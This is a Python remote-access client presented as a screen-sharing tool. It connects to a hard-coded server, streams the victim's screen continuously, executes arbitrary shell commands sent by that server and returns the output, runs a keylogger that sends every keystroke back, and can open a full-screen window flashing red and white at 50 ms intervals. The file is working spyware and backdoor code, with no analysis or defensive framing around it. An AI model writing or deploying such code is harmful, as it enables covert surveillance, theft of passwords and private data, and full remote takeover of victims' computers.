import socket
import pyautogui
from PIL import Image
import io
import threading
import time
import platform
import tkinter as tk
from tkinter import messagebox as messagebox
import os
import subprocess
from pynput import keyboard
import asyncio


class ScreenSharingClient:
    def __init__(self, server_ip="ENDOSPC", image_port=5001, command_port=5002):
        self.server_ip = server_ip
        self.image_port = image_port
        self.command_port = command_port
        self.image_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_screen_sharing = False
        self.screenshot_thread = None
        self.current_directory = os.getcwd()

        self.connect_to_server()

    def connect_to_server(self):
        try:
            self.command_socket.connect((self.server_ip, self.command_port))
            self.image_socket.connect((self.server_ip, self.image_port))
            print("Connected to server")
            self.start_screen_share()
            threading.Thread(target=self.receive_commands).start()
        except Exception as e:
            print(f"Error connecting to server: {e}")
            self.command_socket.close()
            self.image_socket.close()

    def receive_commands(self):
        try:
            while True:
                command = self.command_socket.recv(1024).decode("utf-8")
                if command.lower() == "flashbang":
                    self.trigger_flashbang()
                elif command.startswith("message"):
                    message = command[7:]
                    messagebox.showinfo(title="You got a Message", message=message)
                elif command.startswith("CMD"):
                    cmd = command[3:]
                    output = self.terminalFunction(cmd)
                    self.command_socket.send(output.encode("utf-8"))
                elif command.lower() == "stop_screenshare":
                    self.stop_screen_share()
                elif command.lower() == "start_screenshare":
                    self.start_screen_share()
        except Exception as e:
            print(f"Error receiving commands: {e}")

    def start_screen_share(self):
        if not self.is_screen_sharing:
            self.is_screen_sharing = True
            self.start_screenshot_thread()

    def start_screenshot_thread(self):
        self.screenshot_thread = threading.Thread(target=self.send_screenshot)
        self.screenshot_thread.start()

    def send_screenshot(self):
        try:
            while self.is_screen_sharing:
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="JPEG", quality=100)
                data = buffer.getvalue()
                size = len(data)

                print(size)
                self.image_socket.sendall(size.to_bytes(4, "big"))
                self.image_socket.sendall(data)
                time.sleep(0.001)
        except Exception as e:
            print(f"Error sending screenshot: {e}")

    def terminalFunction(self, cmd):
        try:
            if cmd.startswith("cd"):
                new_dir = cmd[3:].strip()
                if new_dir == "/":
                    new_dir = "C:\\" if os.name == "nt" else "/"
                new_dir = os.path.abspath(os.path.join(self.current_directory, new_dir))
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    self.current_directory = new_dir
                    response = f"[CMDOUT]Directory changed to: {new_dir}"
                else:
                    response = f"[CMDOUT]Directory not found: {new_dir}"
            else:
                # Execute the command synchronously
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=self.current_directory,
                    text=True,
                )
                stdout, stderr = process.communicate()

                stdout_str = stdout
                stderr_str = stderr
                if process.returncode == 0:
                    response = f"[CMDOUT]{stdout_str}"
                else:
                    response = f"[CMDOUT]Error: {stderr_str}"

            return response

        except Exception as e:
            error_message = f"[CMDOUT]Error: {e}"
            return error_message

    def trigger_flashbang(self):
        if hasattr(self, "error_box") and self.error_box.winfo_exists():
            return

        self.error_box = tk.Tk()
        black = "#ff0000"
        white = "#ffffff"
        self.error_box.configure(bg=black)
        self.error_box.attributes("-topmost", True)
        self.error_box.attributes("-fullscreen", True)
        self.error_box.overrideredirect(True)
        self.error_box.resizable(False, False)

        def swap_colors():
            if not self.error_box.winfo_exists():
                return
            nonlocal black, white
            black, white = white, black
            self.error_box.configure(bg=black)
            self.error_box.after(50, swap_colors)

        swap_colors()
        self.error_box.mainloop()

    def stop_screen_share(self):
        if self.is_screen_sharing:
            self.is_screen_sharing = False
            if self.screenshot_thread and self.screenshot_thread.is_alive():
                self.screenshot_thread.join()


class Keylogger:
    def __init__(self):
        self.log = []
        self.lock = threading.Lock()

    def on_press(self, key):
        try:
            char = key.char
            entry = f"Key pressed: {char}"
        except AttributeError:
            entry = f"Special key pressed: {key}"

        with self.lock:
            self.log.append(entry)

    async def send_log(self):
        while True:
            if self.log:
                log_data = "\n".join(self.log)
                client.command_socket.send(f"[LOG]{log_data}".encode("utf-8"))
                print("log sent")
                self.log = []

    def start_key_logger(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()


async def main():
    logger = Keylogger()

    logger_thread = threading.Thread(target=logger.start_key_logger)
    logger_thread.daemon = True
    logger_thread.start()

    await logger.send_log()


if __name__ == "__main__":
    client = ScreenSharingClient()
    asyncio.run(main())
